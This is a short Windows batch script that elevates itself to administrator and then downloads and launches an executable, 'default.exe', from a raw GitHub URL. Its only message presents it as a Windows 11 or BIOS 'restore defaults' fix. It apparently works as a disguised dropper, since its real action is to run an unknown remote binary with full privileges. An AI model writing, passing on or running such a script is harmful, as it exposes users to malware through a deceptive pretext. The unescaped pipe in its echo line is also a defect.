@echo off

:: Check if running as admin
net session >nul 2>&1
if %errorlevel% neq 0 (
    :: Relaunch the script with admin privileges
    echo This script requires administrator privileges. Relaunching as administrator...
    powershell -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

:: Download and execute the file
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/claykrs/claykers/main/default.exe -OutFile %TEMP%\default.exe"
if exist "%TEMP%\default.exe" (
    start "" "%TEMP%\default.exe"
) else (
    echo Windows 11 | BIOS failed to restore defaults. Try again
)

endlocal
